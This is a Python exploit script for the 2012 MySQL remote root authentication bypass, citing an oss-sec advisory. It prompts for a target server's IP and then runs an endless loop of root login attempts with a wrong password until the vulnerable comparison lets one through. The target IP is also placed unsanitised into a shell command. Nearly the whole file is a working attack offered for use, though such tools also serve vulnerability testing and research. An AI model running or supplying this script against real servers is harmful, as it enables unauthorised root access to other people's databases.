#!/usr/bin/python
# coding=utf-8
#
#
# This has to be the easiest "exploit" ever. Seriously. Embarassed to submit this a little.
#
# Title: MySQL Remote Root Authentication Bypass
# Written by: Dave Kennedy (ReL1K)
# http://www.trustedsec.com
#
# Original advisory here: seclists.org/oss-sec/2012/q2/493
#
import subprocess

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

print("""
This has to be the easiest "exploit" ever. Seriously. Embarassed to submit this a little.

Title: MySQL Remote Root Authentication Bypass
Written by: Dave Kennedy (ReL1K)
http://www.trustedsec.com

Original advisory here: seclists.org/oss-sec/2012/q2/493

Note, you will see a number of failed login attempts, after about 300, if it doesn't
work, then its not vulnerable.
""")
ipaddr = input("Enter the IP address of the mysql server: ")

while True:
    subprocess.Popen("mysql --host={0} -u root mysql --password=blah".format(ipaddr), shell=True).wait()
